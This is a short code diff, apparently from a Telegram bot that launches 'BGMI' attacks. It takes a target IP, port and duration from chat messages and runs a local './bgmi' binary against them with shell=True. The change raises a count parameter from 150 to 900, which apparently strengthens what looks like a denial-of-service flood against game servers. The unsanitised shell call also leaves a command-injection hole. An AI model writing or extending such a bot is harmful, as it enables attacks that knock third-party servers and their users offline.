@@ -297,7 +297,7 @@ def handle_bgmi(message):
     	port = int(command[2])
     	time = int(command[3])
     	start_attack_reply(message, target, port, time)
-    	full_command = f"./bgmi {target} {port} {time} 150"
+    	full_command = f"./bgmi {target} {port} {time} 900"
     	process = subprocess.run(full_command, shell=True)
     	response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
     	bot.reply_to(message, response)
